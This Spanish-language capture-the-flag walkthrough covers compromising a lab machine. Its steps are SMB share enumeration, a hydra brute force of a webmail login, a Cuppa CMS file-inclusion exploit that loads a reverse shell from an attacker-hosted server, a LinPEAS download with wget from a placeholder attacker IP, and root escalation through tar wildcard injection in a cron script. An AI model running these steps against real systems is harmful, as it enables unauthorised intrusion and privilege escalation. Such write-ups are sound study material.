- Empezamos enumerando los puertos con ==nmap==, teniendo los puertos 139, 80, 445, 143, 110 y 22, siendo el 445 de importancia ya que es un puerto donde se ejecuta ==samba==.
- Ahora usamos ==gobuster== para encontrar algún directorio.
- Podemos ver que se ejecuta ambien ==smbd== así que vamos a usar ==smbclient==
```
smbclient -L (IP_VICTIMA)
```


![](../Imagenes/Pasted%20image%2020250125193854.png)

- Vamos a ver el directorio ==anonymous==. Para eso utilizamos el siguiente comando:
```
smbclient //(IP_VICTIMA)/(NOMBRE_DIRECTORIO)
```


![](../Imagenes/Pasted%20image%2020250125194134.png)

- Estamos dentro a ese recurso.
- Para listar usamos el comando `dir`

![](../Imagenes/Pasted%20image%2020250125194220.png)

- Ahora sabemos que tenemos a nuestra disposición esta información por el recurso ==anonymous==.
- Ahora, vamos a descargar todos los archivos de ese recurso con el siguiente comando:
```
smbget -R smb://(IP_VICTIMA)/(RECURSO)
```
- Si no resulta este comando usamos solo el comando `get.

![](../Imagenes/Pasted%20image%2020250125200725.png)

- Descargamos un archivo con contraseñas.
- Gobuster nos arrojo una pagina de correos.

![](../Imagenes/Pasted%20image%2020250125201111.png)

- Ya que tenemos la contraseña y un posible usuario, vamos a usar burpsuite para entrar.

![](../Imagenes/Pasted%20image%2020250125201400.png)

- Ahora nos vamos al terminal y usamos ==hydra==.

![](../Imagenes/Pasted%20image%2020250125202020.png)

- La primera parte después del " es la URL que cambia cuando nos equivocamos con la contraseña.

![](../Imagenes/Pasted%20image%2020250125202133.png)

- Ya tenemos credenciales.
- Ya dentro y con esta password

![](../Imagenes/Pasted%20image%2020250125202457.png)

- Podemos entrar al smb.
```
smbclient -U (NOMBRE_USUARIO) //(IP_VICTIMA)/(RECURSO)
```


![](../Imagenes/Pasted%20image%2020250125202808.png)

- Buscando encontramos este directorio

![](../Imagenes/Pasted%20image%2020250125203333.png)

- Así que vamos a enumerar rutas bajo esta ruta.
- Usamos ==gobuster==
```
gobuster dir -u http://10.10.33.74/45kra24zxs28v3yd/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 -r
```
- Tenemos otro directorio.

![](../Imagenes/Pasted%20image%2020250125203712.png)


![](../Imagenes/Pasted%20image%2020250125203738.png)

- Tenemos 2 posibles credenciales.
- En este caso ninguna de las que ya tenemos funciona.
- Vamos a buscar un sploit que nos funciona.
- Vamos a la pagina exploit-db.com
- Buscamos por Cuppa.

![](../Imagenes/Pasted%20image%2020250125204037.png)

-  El exploit nos muestra 2 formas posibles de explotarlo

![](../Imagenes/Pasted%20image%2020250125204517.png)

- Siendo el primero que nos permite ejecutar programas de la maquina atacante desde la maquina victima y el segundo si ponemos /alerts hacia adelante en la URL nos permite visualizar el archivo passwd donde podremos sacar algunas credenciales.
- En este caso vamos a seleccionar la primera.
- Vamos a hacer un one liner (reverse) con nano.
- Ya creado, con python levantamos un servidor web.
```
python3 -m http.server 80
```
- Ya creado, copiamos la primera ruta y la pegamos en el URL

![](../Imagenes/Pasted%20image%2020250125205826.png)

- Ya estamos dentro.

![](../Imagenes/Pasted%20image%2020250125210457.png)

- Vamos a usar la herramienta ==LinPEAS== vamos a buscar vulnerabilidades en la maquina.
- Como vemos que la maquina victima es x64 tenemos que descargarnos la herramienta para esa maquina.

![](../Imagenes/Pasted%20image%2020250125210904.png)

- Ahora tenemos que subir el ejecutable con python.
- Para pasarlo, desde la maquina victima usamos el siguiente comando:
```
wget http://(IP_ATACANTE):(PUERTO)/(NOMBRE_ARCHIVO)
```
==Se recomienda descargarlo en el fichero /tmp ya que es menos conflictivo al momento de pasarse archivos.==


![](../Imagenes/Pasted%20image%2020250125211518.png)

- Le damos permiso de ejecución.
- Ejecutamos
```
./lin
```

![](../Imagenes/Pasted%20image%2020250125212258.png)

- Vamos a utilizar esto que nos dice que cada 1 minutos se ejecuta backup.sh en usuario root.
- Hay que acceder a esa ruta.

![](../Imagenes/Pasted%20image%2020250125212418.png)

![](../Imagenes/Pasted%20image%2020250125212455.png)

- Ya que podemos ver el ejecutable vamos a usar `cat` para leer el ejecutable.

![](../Imagenes/Pasted%20image%2020250125212616.png)

- Como podemos ver:
	- Nos crea un /bin/bash.
	- Se mueve a la carpeta /html
	- Usa `tar` que sirve para extraer los archivos acompañado de `cf` que agrupa varios archivos en un archivo comprimido que en este caso seria backup.tgz
- Ahora es la escala de privilegios.
- Para explicar esto nos meteremos a esta pagina: https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/
- Vamos a ocupar este método.

![](../Imagenes/Pasted%20image%2020250125213519.png)

- La segunda línea y tercera.
- Estos archivos lo tenemos que crear en /var/www/html

![](../Imagenes/Pasted%20image%2020250125213737.png)


![](../Imagenes/Pasted%20image%2020250125213838.png)


- Ahora nos creamos un archivo shell.sh con nano.
- Agregamos este comando.

![](../Imagenes/Pasted%20image%2020250125214718.png)


![](../Imagenes/Pasted%20image%2020250125215417.png)

